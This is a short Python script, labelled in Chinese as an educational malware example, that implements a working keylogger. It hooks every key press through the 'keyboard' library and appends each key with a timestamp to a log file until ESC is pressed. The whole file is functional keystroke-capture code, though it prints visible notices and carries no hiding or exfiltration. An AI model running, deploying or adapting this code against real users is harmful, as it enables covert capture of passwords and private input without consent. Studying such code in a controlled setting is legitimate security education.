# 警告：仅在受控环境中用于学习目的
from datetime import datetime

import keyboard


class BasicKeylogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.is_recording = False

    def on_key_press(self, event):
        if self.is_recording:
            with open(self.log_file, 'a') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {event.name}\n")

    def start(self):
        self.is_recording = True
        keyboard.on_press(self.on_key_press)
        print("开始记录键盘输入（教育演示）")
        keyboard.wait('esc')  # 按ESC键停止

    def stop(self):
        self.is_recording = False
        print("记录已停止")


# 使用示例
if __name__ == "__main__":
    print("=== 恶意代码学习示例 - 键盘记录器 ===")
    print("此代码仅用于教育目的，需在虚拟机中运行")
    keylogger = BasicKeylogger()
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()